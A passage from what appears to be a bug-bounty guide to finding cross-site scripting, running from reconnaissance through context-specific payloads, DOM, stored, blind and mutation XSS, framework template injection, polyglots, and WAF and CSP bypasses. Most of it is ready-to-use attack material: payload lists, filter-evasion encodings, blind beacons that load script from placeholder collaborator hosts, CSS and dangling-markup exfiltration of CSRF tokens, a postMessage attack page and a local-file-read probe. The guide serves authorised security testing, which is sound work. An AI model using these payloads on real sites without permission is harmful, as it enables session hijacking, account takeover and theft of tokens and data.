  (`<scr<script>ipt>`), **encoding**, or **move to another input/context** (§18).
- **Percent-encoded in the page (`%3C`)** → a **decoding-layer mismatch** → feed the layer that decodes (single/double encode).

> **Test characters ONE AT A TIME.** The classic win is "`<` is encoded but `"` is raw" — you'd miss it if you only ever
> threw `<script>`. Each character has its own fate; map them, then build the breakout from whatever survived.

---

# 4. Reconnaissance — Mapping the Injection Surface

Goal of this phase: a list of **every place attacker data could reach a sink**. Coverage beats cleverness — most missed XSS is a missed *parameter*, not a missed payload.

## 4.1 Harvest endpoints & parameters
```bash
# Historical URLs (find old/forgotten params)
echo "target.com" | waybackurls | tee wb.txt
echo "target.com" | gau --threads 5 | tee -a wb.txt
katana -u https://target.com -jc -kf all -d 3 -o katana.txt   # crawl + parse JS

# Keep only URLs that HAVE parameters, dedupe by param-set
cat wb.txt | grep "=" | qsreplace -a 2>/dev/null | sort -u > params.txt
# (qsreplace: github.com/tomnomnom/qsreplace)

# Mine hidden params not visible in the UI
arjun -u "https://target.com/search" -m GET
arjun -u "https://target.com/api/profile" -m JSON
```

## 4.2 Don't forget the non-obvious sources
```
□ URL query string             ?q= ?search= ?redirect= ?next= ?returnUrl= ?lang= ?theme=
□ URL path segments            /user/<here>/profile  (reflected in breadcrumbs/titles)
□ URL fragment (#...)          DOM-only source — never sent to server, pure client-side (§11)
□ POST body fields             every form field, including hidden ones
□ JSON request body keys       APIs that render into emails/PDFs/admin UIs (blind! §13)
□ HTTP headers                 Referer, User-Agent, X-Forwarded-For/Host, Origin, Accept-Language,
                               True-Client-IP, X-Api-Version  → often logged & rendered in admin tools (blind!)
□ Cookies                      values reflected in the page or in error/debug output
□ File upload                  filename, EXIF, SVG/HTML/XML content, CSV cells (§16)
□ WebSocket frames             chat/notification messages rendered with innerHTML
□ postMessage data             cross-frame; sink in the receiver's handler (§11)
□ Email / notification render  your input → an email/PDF/slack message → rendered HTML (blind! §13)
```

## 4.3 Find reflective params fast
```bash
# kxss / Gxss: show which params reflect special chars unfiltered
cat params.txt | Gxss -c 50 | tee reflected.txt
cat params.txt | kxss          # prints which of < > " ' ( ) etc. survive

# Dalfox pipeline: discover + verify
cat params.txt | dalfox pipe --waf-evasion --custom-payload XSS_PAYLOAD_ARSENAL.md
```

> Output of this phase feeds **§5**: a shortlist of inputs that reflect *and* keep dangerous characters. Those are your real candidates.

---

# 5. Reflection Detection & Context Identification

This is the most important *technical* phase. Skipping it is why people fire wrong payloads for hours.

## 5.1 Step 1 — Inject a unique, neutral marker
Use a string that won't be filtered and is easy to grep, with no HTML metacharacters yet:
```
Marker:  zqxj9zqxj9        (random, unique per param so you know WHICH param landed where)
```
Fire it into every candidate input. Search the **rendered response** (and the **live DOM** via DevTools, for DOM XSS) for `zqxj9zqxj9`.

## 5.2 Step 2 — Probe which characters survive
Once you see the marker reflect, send a *character probe* and inspect exactly how each is encoded:
```
Probe:  zqxj9'"<>(){}[];/\=`zqxj9
```
Look at the response/DOM for each char:

| In response you see | Meaning |
|---------------------|---------|
| `<` `>` literal (not `&lt;`) | HTML-tag injection likely possible → **§6** |
| `"` `'` literal inside an attribute | attribute breakout possible → **§7** |
| `<` encoded but `"`/`'` literal in a `<script>` string | JS-string breakout → **§8** |
| Everything HTML-encoded (`&lt; &gt; &quot;`) | server encodes for HTML — pivot to attribute/JS/URL context or DOM (§11) |
| Reflected only after JS runs (not in raw HTML) | **DOM XSS** — go to **§11** |

## 5.3 Step 3 — Name the context precisely
Right-click → *View Source* (raw) and find your marker. Determine **which of the seven contexts (§3.3)** it sits in. *Then* pick the matching breakout from the section below or `XSS_PAYLOAD_ARSENAL.md`.

```
Example raw reflections and the context they imply:
  <h1>Results for zqxj9</h1>                         → HTML body            (§6)
  <input type="text" value="zqxj9">                  → attribute, quoted    (§7)
  <input type=text value=zqxj9>                      → attribute, unquoted  (§7)
  <a href="zqxj9">click</a>                          → URL/href context     (§9)
  <script> var q = "zqxj9"; </script>                → JS string            (§8)
  <div style="width:zqxj9px">                        → CSS                  (§10)
  (nothing in source; appears in DOM after load)     → DOM-based            (§11)
```

## 5.4 Step 4 — Confirm execution, not just injection
A reflected `<h1>zqxj9` proves *reflection*. Your PoC must prove **code runs**. Use a self-evident, harmless-but-unambiguous trigger:
```
alert(document.domain)          // proves origin — better than alert(1) for reports
print()                         // survives some alert-blocking; visible
console.log(document.domain)    // quiet confirm; pair with a screenshot of console
// Best for a report: fetch your collaborator so the callback *proves* exec server-side too:
new Image().src='//YOUR.oast.fun/x?d='+document.domain
```
> Triagers want to see `document.domain` (or a collaborator hit from the target origin), not `alert(1)`. It proves *which origin* executed — which is the whole point. See **§38**.

---

# PART II — EXPLOITATION BY CONTEXT (work in this order)

> Pick the section that matches the context you identified in **§5.3**. Full payload variants live in `XSS_PAYLOAD_ARSENAL.md`; the examples here teach the *breakout logic*.

# 6. HTML Body Context

Your marker lands between tags: `<div>MARKER</div>`. You can introduce a new element.

```html
<!-- Classic (often filtered; try anyway to gauge the filter) -->
<script>alert(document.domain)</script>

<!-- Auto-firing, no click, short — the workhorses -->
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe src=javascript:alert(document.domain)>
<details open ontoggle=alert(document.domain)>

<!-- When <script> / on-handlers are stripped, try less common tags/events -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
```

**Logic:** if `<` and `>` survive (per §5.2), inject an element whose *event* auto-fires (`onload`, `onerror`, `ontoggle`, `onfocus autofocus`, `onbegin`) so it needs **no user interaction** — that's what keeps it 0-click and high-severity.

**If tags are partially stripped:** the sanitizer may remove `<script>` but miss `<svg>`/`<math>`/`<details>` or strip `on*` but miss SVG `animate`/`set`. Enumerate which tags/attributes survive (§20) — that *is* the bypass.

---

# 7. HTML Attribute Context

Your marker lands inside an attribute value: `<input value="MARKER">`.

## 7.1 Quoted attribute — break out
```html
<!-- value="MARKER"  → close quote, close tag, inject -->
"><svg onload=alert(document.domain)>
"><img src=x onerror=alert(1)>

<!-- If you can't break the TAG but can add an attribute (quote survives, > is encoded): -->
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
```

## 7.2 Unquoted attribute
```html
<!-- value=MARKER  → a space starts a new attribute, no quote needed -->
x onmouseover=alert(1)
x onfocus=alert(1) autofocus
```

## 7.3 Inside an event-handler attribute already (JS-in-attribute)
```html
<!-- <a href="#" onclick="doThing('MARKER')">  → you're in a JS string in an attribute -->
');alert(1)//
'-alert(1)-'
```
Remember HTML-attribute values are **HTML-decoded before JS runs**, so HTML entities work here:
```html
<!-- onclick="...MARKER..."  where ' is filtered but &#39; is not -->
&#39;);alert(1)//
```

## 7.4 Special: `href`/`src`/`action`/`formaction` → see **§9**
If your attribute is itself a URL sink, you don't need to break out — `javascript:` *is* the payload.

---

# 8. JavaScript Context

Your marker lands inside a `<script>` block or a JS string. This is high-value because you're *already in JS* — no tag injection needed, which often **sidesteps HTML sanitizers and some CSP** (inline already runs).

## 8.1 Inside a JS string
```javascript
// var q = "MARKER";   → close the string and statement
";alert(document.domain)//
";alert(document.domain);var z="
// single-quoted:  var q = 'MARKER';
';alert(document.domain)//
// inside template literal:  var q = `MARKER`;
${alert(document.domain)}
```

## 8.2 When quotes are escaped but backslash isn't sanitized
```javascript
// app does  "MARKER".replace(", \")  but lets your backslash through:
// input  \"  → output  \\"  ... test:  if your \ is NOT doubled, you can neutralize their escape
\";alert(1)//
```

## 8.3 Inside a JS comment / dead code
```javascript
// var x = 1; // MARKER   → newline breaks out of the comment (if \n survives)
%0aalert(1)
```

## 8.4 Inside JSON embedded in a script
```javascript
// <script>var data = {"name":"MARKER"};</script>
</script><svg onload=alert(1)>          // break the whole script element (if < > survive)
"};alert(1);var x={"a":"                // break the JS object (if " survives, < > encoded)
```
> **Why this context pays:** inline JS contexts frequently **defeat a CSP that only restricts `script-src` for external/`<script>` tags but allows the already-inline script to run your injected code**, and they bypass HTML-focused WAFs. Always check whether you can land in JS rather than HTML.

---

# 9. URL / `href` / `src` Context

Your marker is used as a URL: `<a href="MARKER">`, `window.location=MARKER`, `<iframe src=MARKER>`, an open-redirect `?next=MARKER`, or a framework router link.

```
javascript:alert(document.domain)
javascript:alert(document.domain)//        (comment tail to swallow appended text)
JaVaScRiPt:alert(1)                          (case)
java%0ascript:alert(1)                       (newline obfuscation in some parsers)
data:text/html,<script>alert(1)</script>    (for src/iframe; blocked in top-nav on modern Chrome)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**Where this hits hard:**
- `href`/`formaction`/`xlink:href` that accept `javascript:` → 1-click XSS.
- Client-side **open redirect that flows into `location.href`/`location.assign`** → DOM XSS via `javascript:` (huge, often missed — see §11).
- SPA routers and OAuth `redirect_uri`/`returnUrl` that get assigned to `location`.

> `javascript:` URIs only execute on **navigation** (click / `location=` / form submit), not when merely set as an `<img src>`. Match the sink to the trigger.

---

# 10. CSS Context

Your marker lands in a `style` attribute or `<style>` block: `<div style="color:MARKER">`.

- **Modern browsers do not execute JS from CSS** (`expression()` died with old IE). So pure-CSS XSS is mostly historical.
- **Still useful for:**
  - **Breaking out of `style` into a new tag/attribute** if `"`/`>` survive: `red"></style><svg onload=alert(1)>`.
  - **CSS data exfiltration** (no JS): attribute-selector + `background:url()` to leak input values / CSRF tokens character-by-character — relevant when JS is fully blocked by CSP but `style`/`<style>` injection is allowed.
  - **UI redress / clickjacking-style overlays** via injected CSS.

```css
/* CSS exfil of a CSRF token value, char by char (no JS needed) */
input[name="csrf"][value^="a"]{background:url(//YOUR.oast.fun/leak?c=a)}
input[name="csrf"][value^="b"]{background:url(//YOUR.oast.fun/leak?c=b)}
/* ... repeat per character; iterate prefixes to recover the full token */
```
> CSS injection is rarely the headline, but **CSS exfil is a legitimate escalation when CSP blocks JS** — it turns "injection with no JS exec" into "token/credential disclosure" (§26). Report the *disclosure*, not the CSS.

---

# 11. DOM-Based XSS — Source-to-Sink Tracing

The payload never appears in the server's HTML — a **client-side script** reads a source and writes it to a dangerous sink. Server-side WAFs and even CSP `script-src` can be irrelevant if the sink builds inline behavior. **Undervalued; hunt it.**

## 11.1 The model
```
SOURCE (attacker-controlled)            →  SINK (executes)
location.hash / .search / .href            innerHTML / outerHTML / document.write
document.referrer                          insertAdjacentHTML / $(x).html()
window.name                                eval / setTimeout(str) / Function()
postMessage event.data                     location = / .href = (javascript:)
localStorage / sessionStorage              jQuery .html()/.append()/.parseHTML()
URLSearchParams / decodeURIComponent        element.setAttribute('href'/'src', ...)
```

## 11.2 Find it (the fast way: DOM Invader)
1. Burp → open the embedded browser → enable **DOM Invader**.
2. Browse the app; DOM Invader injects a canary into sources and reports **source → sink** flows automatically, including `postMessage` and prototype-pollution gadgets.
3. It even auto-generates the exploit URL for `innerHTML`/`document.write`/`eval` sinks.

## 11.3 Find it manually
```javascript
// In DevTools, search loaded JS for sinks:
//   innerHTML  outerHTML  document.write  insertAdjacentHTML  eval  setTimeout  Function  .html(
// Then backtrace: does the data come from location.hash / .search / referrer / postMessage / name?

// Quick hash-source test (fragment is NEVER sent to server → pure client-side, bypasses server WAF):
https://target.com/page#<img src=x onerror=alert(document.domain)>
https://target.com/page?q=<img src=x onerror=alert(1)>     // if q flows to innerHTML client-side
```

## 11.4 postMessage XSS (cross-frame, often 0-click)
```javascript
// Vulnerable receiver (no origin check, writes to innerHTML):
window.addEventListener('message', e => { document.getElementById('out').innerHTML = e.data; });

// Attacker page frames the target and posts:
const w = window.open('https://target.com/widget');   // or an <iframe>
w.postMessage('<img src=x onerror=alert(document.domain)>','*');
```
Look for: missing `e.origin` validation, `e.data` flowing into `innerHTML`/`eval`/`location`. This is a **0-click** vector (the victim only needs to be on a page that frames the target).

## 11.5 DOM open-redirect → XSS
```javascript
// App:  location = new URLSearchParams(location.search).get('next')
// Exploit:  ?next=javascript:alert(document.domain)
// Often the same bug that's reported as "open redirect" is actually DOM XSS — test javascript:/data:.
```

## 11.6 Why DOM XSS over-pays relative to effort
- Frequently **bypasses server WAF** (fragment never sent; client builds the HTML).
- Can **bypass CSP** if the sink is `location=javascript:` (navigation, not `script-src`) or if a `script-gadget` in a trusted framework executes your injected markup.
- SPA-heavy targets (React/Angular/Vue) hide dozens of these in router/state code. De-minify the bundle (§15) and grep for sinks.

## 11.7 DOM Clobbering — turn *HTML-only* injection into JS compromise (no `<script>`, beats many sanitizers)
**What it is:** the browser auto-creates **global variables / `document` properties from element `id`/`name` attributes** (`<a id=x>` makes `window.x` / `document.x` point at that element). So when an app does `if (window.config) … = config.url` or `var x = document.currentScript`, you can **"clobber"** that variable by injecting a *named element* — **no script, no event handler** — which sails through HTML-only sanitizers (DOMPurify by default **allows** `id`/`name`). You then steer a sink (a `src`, `href`, `innerHTML`, or a config lookup) into XSS.
```
The primitives (inject these as plain HTML):
  <a id=x href="javascript:alert(document.domain)">           → window.x.href controllable
  <a id=config><a id=config name=url href="//evil">          → window.config = HTMLCollection; config.url = the 2nd element
  <form id=x><input name=y>                                  → x.y clobbers nested property (x.y)
  <img name=getElementById>                                  → clobbers document.getElementById (breaks/0wns library lookups)
  <iframe name=self srcdoc=...> / <embed name=...>           → clobber window.self / frame refs
  3-level chain: <a id=a><a id=a name=b><a id=a name=b ... >  → a.b.c via HTMLCollection nesting
Find the gadget: grep the bundle (§15) for  document.<name> / window.<name> / `||` default-config reads / currentScript /
  `el.src = X.url` patterns where X is a global the app *assumes* it set.
```
> **If this → then that:** you can inject **HTML but not script** (a markdown/rich-text field, a DOMPurify-sanitized blob) and a sanitizer strips `<script>`/`onerror` → look for a **DOM-clobbering gadget**: a global/config the JS reads that you can override with `<a id=…>`/`<form>`/`<img name=…>`. Clobber it to point a `src`/`href`/`innerHTML` sink at your payload → **DOM XSS through HTML-only injection**. Real-world: this is the classic **DOMPurify-allows-`id`/`name` → clobber the sanitizer's own config / a framework's `loadScript({url})`** chain. Impact = full DOM XSS → ATO (§24–§27).

---

# 12. Stored / Persistent XSS & Second-Order

The highest-value class: your payload is **saved** and rendered to **other users** with **no interaction**.

## 12.1 Where stored XSS hides
```
□ Profile fields      name, bio, "about", company, address, signature, status
□ Content             posts, comments, reviews, messages, tickets, wiki, notes, filenames
□ Indirect/meta       display name shown in an admin "users" table; support-ticket subject;
                      device/User-Agent shown in a "sessions" admin page; referrer in analytics UI
□ Config/labels       team name, project name, webhook label, API-key name, saved-search name
□ Second-order        input stored harmlessly in context A, later rendered UNescaped in context B
                      (e.g. set as JSON, later echoed into an HTML email or admin dashboard)
```

## 12.2 Method
1. Plant a **context-probing marker** (per §5) in every stored field.
2. **Render it everywhere it can surface** — your own profile page, the public view, the admin/moderator view, search results, exports (PDF/CSV/email), API responses consumed by another UI.
3. The win is when it renders **in a context you didn't submit from** (second-order) or **in another user's/admin's view** (the impact).

## 12.3 Second-order is where pros find what scanners miss
Input may be safely encoded on the page you submitted it, but **reused elsewhere**:
```
You set "display name" = <img src=x onerror=...>  → safe (encoded) on your profile
... but the same value is rendered RAW in:
   - the moderation queue an admin opens     → 0-click admin XSS (Critical, §32)
   - a notification email's HTML body
   - a CSV/PDF export opened by staff
   - a "recent signups" internal dashboard
```
Trace your stored value through **every consumer**, not just the submit page. This requires the OOB/blind technique (§13) when you can't see the admin view.

## 12.4 Severity driver
Stored XSS that fires **0-click in another user's authenticated session** is High; **in an admin/staff session** it's typically Critical (admin ATO / full compromise, possibly wormable, §33).

---

# 13. Blind XSS — Out-of-Band Delivery

Your input is stored and later rendered in a UI you **cannot see** (admin panel, support/CRM tool, logging/SIEM dashboard, internal analytics). You learn it fired only via an **out-of-band callback**.

## 13.1 Where blind XSS lands (target these inputs)
```
□ Support / contact / "report a problem" forms      → render in a support agent's CRM
□ Feedback / review / rating with a comment          → moderation dashboard
□ User-Agent / Referer / X-Forwarded-For headers     → admin "traffic"/"sessions"/"logs" view
□ Account fields shown to staff (name, address)      → internal user-management UI
□ Order/booking notes, delivery instructions         → fulfilment/ops dashboard
□ Filenames / upload metadata                         → admin file browser
□ API error messages you can influence                → log viewer / SIEM with HTML render
```

## 13.2 Set up a blind-XSS payload that reports back
Use **self-hosted XSS Hunter** or a collaborator. The payload should fire, then exfil *context* (URL, cookies if non-HttpOnly, DOM, a screenshot) so you can prove **where** it executed.

```html
<!-- Minimal blind beacon: just prove it fired and from where -->
<script src=//YOUR.xss.ht></script>
"><script src=//YOUR.xss.ht></script>
<img src=x onerror="import('//YOUR.oast.fun/b.js')">

<!-- Multi-context blind payload (survives various breakouts) -->
javascript:eval('var a=document.createElement(\'script\');a.src=\'//YOUR.xss.ht\';document.body.appendChild(a)')
```
See `poc/blind_xss.js` for a beacon that reports `location`, `document.domain`, cookies (non-HttpOnly), localStorage keys, and the page title — exactly the evidence that proves you landed in an internal admin tool.

## 13.3 Spray-and-wait methodology
1. Plant the blind payload in **every** staff-visible field/header you can (§13.1) with a **unique tag per location** (`?loc=ticket-subject`) so the callback tells you *which* input fired.
2. Wait (hours–days). The callback's **page URL + DOM** reveals the internal tool.
3. Escalate from there: if it fired in an admin panel, you may now have **admin DOM access** → read admin-only data, perform admin actions via the admin's session (§32).

> Blind XSS is the classic "low-effort input, very-high-impact landing" — a feedback form payload firing in a super-admin dashboard is routinely Critical.

---

# 14. Mutation XSS (mXSS) & Sanitizer Bypass

Modern apps sanitize HTML (DOMPurify, sanitize-html, OWASP Java HTML Sanitizer, bleach). mXSS exploits the gap between what the **sanitizer parses** and what the **browser re-parses** after insertion — the markup *mutates* into something executable.

## 14.1 The idea
The sanitizer sees safe-looking nodes; but when the result is set via `innerHTML`, the browser's parser re-interprets it (namespace confusion in SVG/MathML, `noscript`/`template`/`style` parsing quirks, attribute back-tick handling) and reconstitutes an executing payload.

```html
<!-- Examples of historically mutation-prone shapes (verify against the TARGET's lib + version) -->
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<template><s><table><div><style><a id="</style><img src=x onerror=alert(1)></a>
```

## 14.2 How to test it for real
1. Identify the **exact sanitizer and version** (often in the JS bundle / package-lock leaked, or via behavior). DOMPurify announces itself; check `DOMPurify.version` in console.
2. Look up **known bypasses for that exact version** (DOMPurify has a public history of bypasses fixed per release — an outdated version is a real finding).
3. Confirm in a local copy of that sanitizer version, then on the target.

## 14.3 Why it pays
A working mXSS against a current sanitizer is **High-impact and hard to dismiss** — it defeats the app's primary defense and usually lands in a stored/rendered-to-others context. An *outdated* DOMPurify with a public bypass is a clean, defensible finding.

---

# 15. Framework-Specific XSS

Modern SPAs auto-encode by default, so XSS shifts to **specific escape hatches** and **client template injection**.

## 15.1 React
```
SAFE by default ({}-expressions are escaped). XSS appears via:
□ dangerouslySetInnerHTML={{__html: userData}}     → classic stored/reflected XSS sink
□ href={userData}  with javascript: URI            → (React ≥16 warns/strips some; test data: & blob:)
□ Rendering user-controlled component props into a ref/innerHTML
□ Server-side rendering (Next.js) injecting unescaped data into the HTML or __NEXT_DATA__ JSON
```
De-minify the bundle, grep `dangerouslySetInnerHTML`, and trace where `__html` comes from.

## 15.2 Angular (2+) — Client-Side Template Injection (CSTI)
```
Angular sandboxes & auto-escapes, BUT:
□ [innerHTML]="userData"  bypasses default escaping for HTML (still sanitized unless...)
□ bypassSecurityTrustHtml / bypassSecurityTrustScript / bypassSecurityTrustResourceUrl
   → developer explicitly disabled sanitization → direct XSS
□ If user input reaches a TEMPLATE that is COMPILED (template injection):
     {{constructor.constructor('alert(1)')()}}
```

## 15.3 AngularJS (1.x) — still common, juicy CSTI
If the app ships AngularJS and user input lands inside an Angular-bound region (`ng-app` scope), even **HTML-encoded** input can execute because Angular evaluates `{{ }}` expressions *after* the browser decodes entities — this **bypasses HTML encoding and many CSPs**:
```
{{constructor.constructor('alert(document.domain)')()}}
{{$on.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)')}}   // sandbox-escape era
```
> **This is a top under-used finding:** if a reflected param sits inside `ng-app` and only `{{}}` are needed (no `< >`), a server that HTML-encodes is *still vulnerable*. Always check for AngularJS when your `< >` get encoded but `{}` survive.

## 15.4 Vue
```
□ v-html="userData"                  → direct HTML sink (XSS)
□ :href="userData" with javascript:  → URL XSS
□ Vue template compiled from user input → template injection {{constructor.constructor('alert(1)')()}}
```

## 15.5 Server-side template-ish: Handlebars/Mustache/Twig/Jinja rendered to the client
- **Triple-stache** `{{{ user }}}` in Handlebars/Mustache renders **raw HTML** → XSS sink.
- Distinguish **client template injection** (executes JS in browser → XSS) from **server-side template injection (SSTI)** (executes on the server → RCE; out of scope for this guide but test for it if `{{7*7}}`→`49`).

## 15.6 jQuery legacy sinks
```javascript
$(location.hash)              // jQuery <1.9 treats #<img...> as HTML → XSS
$.parseHTML(userData)         // builds nodes from string
$(el).html(userData)          // innerHTML sink
$(userControlledSelector)     // selector injection → HTML creation in old jQuery
```

---

# 16. File-Based XSS

User-uploaded or generated files that the browser renders in the app's origin.

## 16.1 SVG (the big one)
SVG is XML that can carry `<script>` and event handlers and is often served inline or from the same origin:
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(document.domain)</script>
</svg>
```
**Severity driver:** if the SVG is served from the **app's own origin** (not a sandboxed CDN) with `Content-Type: image/svg+xml` and rendered (avatar, attachment preview, `<img>`-to-`<object>` swap, direct navigation), the script runs **in the app origin** → real XSS. If served from a separate sandboxed domain or with `Content-Disposition: attachment`, impact drops.

## 16.2 HTML / XML / XHTML uploads
Any uploaded `.html`/`.xhtml`/`.xml` served inline from the app origin = stored XSS. Check the `Content-Type` and `Content-Disposition` the server returns.

## 16.3 Filenames
The **filename** itself is a stored input — `"><img src=x onerror=alert(1)>.png` rendered in a file list / admin uploads view → stored/blind XSS (§13).

## 16.4 PDF / "HTML→PDF" injection
If the app renders user input into a server-side PDF (wkhtmltopdf, headless Chrome), HTML/JS injection can yield **SSRF / local-file read** (`<iframe src=file:///etc/passwd>`) — often more impactful than browser XSS. Test the PDF-generation flow specifically.

## 16.5 Markdown
Markdown renderers that allow raw HTML (or have a `[click](javascript:alert(1))` gap) → XSS. Test both raw HTML pass-through and `javascript:`/`data:` in link/image syntax.

## 16.6 CSV / formula injection (adjacent class)
A cell starting with `= + - @` can execute formulas when opened in Excel/Sheets (data exfil / command exec on the *victim's* machine). Not browser-XSS, but report it where exports are user-controlled.

---

# 17. Polyglots & Multi-Context Payloads

When you can't (or don't want to) determine the context first, a **polyglot** is a single string crafted to execute across many contexts. Use them for **fast triage** and for **blind** inputs where you can't see the reflection.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
```html
<!-- Shorter general-purpose ones -->
"><svg onload=alert(document.domain)>
'"></textarea></script><svg onload=alert(document.domain)>
"><img src=x onerror=alert(document.domain)>
javascript:"/*'/*`/*--></noscript></title></style></textarea></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```
> Polyglots are for **discovery**. For the *report*, switch to the **minimal context-correct payload** — it's clearer, more defensible, and shows you understand the bug (§38). Full polyglot set is in `XSS_PAYLOAD_ARSENAL.md`.

---

# PART III — DEFENSE BYPASS & ADVANCED

# 18. WAF & Filter Bypass

A marker that reflects but whose payload gets a `403`/`406`/scrubbed means a **WAF or input filter** is in the way. Bypass is iterative: find *what specifically* trips it, then mutate only that.

## 18.1 Identify the WAF & the trigger
```
□ Loud test: send <script>alert(1)</script>. Blocked? Now binary-search:
   - <script> alone blocked? <svg> blocked? onerror= blocked? alert blocked? the parens?
□ Fingerprint: Cloudflare (cf-ray), Akamai, AWS WAF (x-amzn), Imperva (incap_ses), F5 (BIGip), wafw00f.
□ Determine WHERE it filters: query vs body vs header vs JSON — sometimes only ONE is inspected.
```

## 18.2 Bypass techniques (mutate the blocked token)
```html
<!-- Case / no-close / alternate tags & events -->
<sCrIpT>alert(1)</sCrIpT>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details/open/ontoggle=alert(1)>

<!-- Encodings (try each; the app decodes at a different layer than the WAF) -->
%3Cscript%3E                              URL-encode
&lt;script&gt;                            HTML-entity (works in HTML-decoded sinks, §7.3)
<script>                        JS-unicode (in JS-string sinks, §8)
&#x3c;svg onload=&#x61;lert(1)&#x3e;       hex entities
<img src=x onerror=&#97;lert(1)>          entity-encode the function name

<!-- Break the keyword without breaking execution -->
<img src=x onerror="alert(1)">       unicode-escape inside JS
<img src=x onerror="top['ale'+'rt'](1)">  string concat to dodge "alert" signature
<svg onload=alert&lpar;1&rpar;>            entity parentheses
<svg onload=top[8680439..toString(30)](1)> // 'alert' from radix math
<img src=x onerror=eval(atob('YWxlcnQoMSk='))> // base64 the payload

<!-- No-parentheses execution (when ( ) are filtered) -->
<svg onload=alert`1`>                      template-literal call
<img src=x onerror=throw onerror=alert,1>  // throw-based (context dependent)

<!-- Whitespace / comment tricks -->
<img/src/onerror=alert(1)>
<img src=x onerror=alert(1)//
<svg on​load=alert(1)>                      (zero-width/control chars between attr and =)
```

## 18.3 Strategy
- **Decode-layer mismatch:** the WAF normalizes once; the app decodes again. Double-encode, mix encodings, or put the payload where the WAF doesn't normalize (e.g. JSON body, a header).
- **Signature splitting:** WAFs match strings like `onerror=alert`. Insert comments, build names by concat/`atob`/radix, or use a different sink/event.
- **Different injection point:** if the query param is filtered, the **same value via a header, JSON field, or path** often isn't.
- **DOM XSS bypasses server WAF entirely** (fragment never sent — §11).

> Document the *exact* mutation that bypassed in your report — programs often want to confirm the WAF gap too, and it strengthens "this is exploitable in production".

---

# 19. CSP Analysis & Bypass (the big one)

Content-Security-Policy is the control most likely to **downgrade or block** your XSS. Read it early; a bypass is itself a finding, and a *blocking* CSP can cap your severity.

## 19.1 Read & score the policy
```bash
# Grab it
curl -sI https://target.com | grep -i content-security-policy
# Or in DevTools → Network → response headers, or a <meta http-equiv="Content-Security-Policy">
```
Paste it into **Google CSP Evaluator**. Then look for these **bypass-enabling weaknesses**:

| CSP weakness | Why it's bypassable |
|---|---|
| `script-src 'unsafe-inline'` | Inline `<script>`/`on*` run → your injection executes directly. CSP provides ~no protection. |
| `script-src 'unsafe-eval'` | `eval`/`Function`/`setTimeout(str)` run → gadget-based exec. |
| `script-src *` or `https:` | Any/any-https host allowed → load your script from anywhere. |
| **Allow-listed CDN with a JSONP endpoint** | `script-src cdn.example.com` where that CDN hosts JSONP or an unsafe lib → callback-based exec (classic Google/Cloudflare bypass via hosted libs like AngularJS). |
| **Allow-listed host serving a `script-gadget`** framework | A trusted Angular/Vue/etc. file on an allowed host lets injected markup execute (Google's "CSP is dead" gadgets). |
| `nonce` reused / predictable / reflected | If the nonce appears in a place you control, you can reuse it. |
| Missing `object-src 'none'` | `<object>/<embed>` flash/plugin or `data:` exec paths. |
| Missing `base-uri` | `<base href>` injection hijacks relative script URLs. |
| `report-uri` only / `Content-Security-Policy-Report-Only` | **Report-only does NOT block** — full XSS still executes. Common mistake; your bug is unaffected. |

## 19.2 Concrete bypass patterns
```html
<!-- 1) unsafe-inline present → just inject inline; CSP doesn't stop you -->
<svg onload=alert(document.domain)>

<!-- 2) Allow-listed CDN hosts AngularJS (or similar) → CSTI gadget executes despite nonce CSP -->
<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>
<script src="//allowed-cdn.example.com/angular.min.js"></script>

<!-- 3) JSONP on an allow-listed origin -->
<script src="//allowed.example.com/api/jsonp?callback=alert"></script>

<!-- 4) base-uri missing → hijack a relative-loaded script -->
<base href="//YOUR.attacker.tld/">

<!-- 5) Dangling-markup / no-JS exfil when scripts are fully blocked (still exfil tokens) -->
<img src='//YOUR.oast.fun/leak?html=     (unterminated → leaks following markup incl. CSRF token)
```

## 19.3 If the CSP genuinely blocks execution
- Your injection may still be a **finding at reduced severity** (e.g. "XSS injection blocked only by CSP; CSP is `report-only`/bypassable/misconfigured elsewhere").
- Pivot to **CSP-independent impact:** dangling-markup token exfiltration, CSS exfil (§10), or DOM `location=javascript:` navigation (not governed by `script-src`).
- Check **every** response — CSP is often present on the main page but **absent on an API/subpage** that also reflects.

> Report the CSP weakness *and* the injection together. "Injection + bypassable CSP" tells the full story; "injection behind a strict, unbypassable CSP" is honestly lower and triagers respect that you said so.

## 19.4 Trusted Types — what it is, and how XSS still happens with it on
**What it is:** Trusted Types (`Content-Security-Policy: require-trusted-types-for 'script'`) is the strongest modern DOM-XSS defense — it makes **dangerous DOM sinks** (`innerHTML`, `Function`, `script.src`, `eval`, …) **throw** unless the value is a `TrustedHTML`/`TrustedScript` object minted by a registered **policy**. With it enforced, a raw `el.innerHTML = userInput` is a runtime error, so classic DOM XSS dies. You must understand it because more high-end targets (Google, etc.) ship it, and "I couldn't pop `alert`" may just mean TT is on — the bug can still be there.
```
Recon:   look for the header `require-trusted-types-for 'script'` and `trusted-types <policyNames>` ;
         or a thrown "This document requires 'TrustedHTML' assignment" in the console.
Bypasses (when TT is enforced):
  1) DEFAULT policy abuse: if the app registers  trustedTypes.createPolicy('default', {createHTML: s=>s})  (or any
     pass-through/under-sanitizing transform) → EVERY sink uses it → your input is auto-trusted → normal DOM XSS works.
  2) NAMED policy reuse: find an exposed/reachable policy whose createHTML/createScriptURL returns input ~unchanged
     (e.g. a framework policy you can feed) → route your payload through it.
  3) trusted-types directive is REPORT-ONLY / not enforced (CSP `report-only`, or set on the page but not the API/subframe
